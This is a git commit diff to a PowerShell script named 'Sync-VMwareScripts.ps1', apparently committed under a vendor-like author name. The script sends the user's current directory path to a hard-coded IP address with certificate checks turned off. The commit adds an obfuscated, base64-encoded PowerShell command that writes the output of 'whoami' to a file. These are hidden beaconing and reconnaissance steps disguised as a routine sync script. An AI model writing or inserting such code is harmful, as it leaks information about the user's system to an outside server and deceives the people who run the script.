341a8835ea1c6ae26f51548757be2c088b85903c
VMwareVCenter <regularlydev@proton.me>
2026-06-05 03:26:07 -0700

    Update Sync-VMwareScripts.ps1

--- Sync-VMwareScripts.ps1
+++ Sync-VMwareScripts.ps1
@@ -1,2 +1,3 @@
 $user = [uri]::EscapeDataString(($PWD.Path))
-curl.exe "https://206.189.113.121:4443/ASD/$user" -k
+curl.exe "https://206.189.113.121:4443/ASD2/$user" -k
+powershell.exe -EncodedCommand dwBoAG8AYQBtAGkAIAA+ACAAYwA6AFwAdABlAHMAdAAuAHQAeAB0AA==
